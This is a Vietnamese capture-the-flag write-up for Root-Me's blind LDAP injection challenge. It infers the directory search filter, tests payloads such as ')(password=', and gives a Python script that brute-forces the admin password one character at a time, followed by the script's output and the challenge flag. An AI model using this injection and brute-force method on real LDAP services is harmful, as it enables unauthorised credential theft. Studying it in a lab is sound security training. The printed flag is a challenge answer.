# [LDAP injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Blind)

## Solutions

Có 2 user input:

- trang authentication: ở đây các kí tự như `*, (, ), ...` sẽ bị báo lỗi
- trang directory: ở đây user input bị lọc lỏng lẻo hơn:
  - không nhập gì mà submit thì có báo lỗi

Kiểm tra trang directory, quan sát được:

- có 2 trường được trả về là `sn` và `email`,
- query của bên trang directory có thể là:
  - `(&(email=*...*)(type=fixed))`: trong đó `...` là nơi input của user được đưa thẳng vào

Kiểm chứng suy đoán ở trên, thử các payload khác nhau:

- `)(sn=` => `(&(email=*)(sn=*)(type=fixed))`: vẫn hiển thị đầy đủ
- `)(sn=C` =>`(&(email=*)(sn=C*)(type=fixed))`: Chỉ hiển thị sn có bắt đầu bằng C

=> Có vẻ ok

Thử thay đổi `sn` thành `password` xem có attribute này không:

- `(&(email=*)(password=*)(type=fixed))`: Chỉ còn hiển thị mỗi email của tài khoản admin

=> có attribute `password` ở tài khoản admin

Để ý thấy filter `(password=*)` có thể giúp ta tìm được mất khẩu của admin, bằng cách bruteforce từng kí tự từ trái sang phải, vd:

- Thử `(password=a*)`, không in ra tài khoản admin => ký tự đầu của password không phải là `a`
- Thử `(password=d*)`, có in ra tài khoản admin => ký tự đầu của password là `d`
- Đã có ký tự đầu, tương tự thử lần lượt các ký tự sau đó, đến khi không còn in ra tài khoản admin nữa là ta đã lấy được đủ password

Viết python script:

```python
import requests

baseURL = 'http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=)(password='
password = ''

# đã loại một số ký tự đặc biệt như là &, #
characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$%\'()*+,-./:;<=>?@[\\]^_`{|}~'

ok = True
while(ok):
    ok = False
    for c in characters:
        r = requests.get(baseURL + password + c)
        if 'admin' in r.text:
            password += c
            ok = True
            break
    print(password)
```

Output:

```text
┌──(kali㉿kali)-[~/Documents]
└─$ python test.py
d
ds
dsy
dsy3
dsy36
dsy365
dsy365g
dsy365gd
dsy365gdz
dsy365gdze
dsy365gdzer
dsy365gdzerz
dsy365gdzerzo
dsy365gdzerzo9
dsy365gdzerzo94
dsy365gdzerzo94
```

Flag: `dsy365gdzerzo94`

## References

- <https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202008%20%20-%20LDAP%20Injection%20&%20Blind%20LDAP%20Injection.pdf?_gl=1>
